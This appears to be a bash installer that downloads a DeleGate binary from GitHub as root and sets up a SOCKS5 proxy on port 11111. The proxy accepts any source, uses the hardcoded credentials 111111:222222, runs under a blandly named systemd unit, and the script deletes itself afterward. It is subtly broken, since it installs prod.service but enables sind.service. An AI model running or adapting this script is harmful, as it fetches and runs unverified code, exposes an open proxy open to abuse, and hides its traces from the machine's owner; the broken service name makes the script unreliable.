#!/bin/bash

#apt-get update
rm -rf delegated
wget https://github.com/008/delegate/raw/master/deleg_ubu16x64.tar.gz
tar xfv de*

mkdir pro
echo "/root/delegated -P11111 RELIABLE=* OWNER=root AUTHORIZER=-list{111111:222222} -vs -vS -vH -vt SERVER=socks5 REMITTABLE=* RES_WAIT=0 MAXIMA=delegated:200 MAXIMA=listen:200 HTTPCONF=max-ckapch:200 HTTPCONF=max-cka:200 TIMEOUT=dns:100,acc:100,con:100,lin:1" > /root/pro/start
chmod +x /root/pro/start

#echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all


echo "[Unit]" > prod.service
echo "Description=distributed service daemon" >> prod.service
echo "After=network.target" >> prod.service

echo "[Service]" >> prod.service
echo "User=$USER" >> prod.service
echo "Group=$USER" >> prod.service

echo "Type=forking" >> prod.service
echo "PIDFile=/var/spool/delegate-root/act/pid" >> prod.service

echo "ExecStart=/root/pro/start" >> prod.service
echo "ExecStop=" >> prod.service

echo "Restart=always" >> prod.service
echo "PrivateTmp=true" >> prod.service
echo "TimeoutStopSec=80s" >> prod.service
echo "TimeoutStartSec=11s" >> prod.service
echo "StartLimitInterval=120s" >> prod.service
echo "StartLimitBurst=5" >> prod.service

echo "[Install]" >> prod.service
echo "WantedBy=multi-user.target" >> prod.service

cp prod.service /etc/systemd/system/

systemctl daemon-reload
sleep 1
systemctl enable sind.service


rm -rf setup.sh
rm -rf deleg_ubu16x64.tar.gz

rm -rf prod.service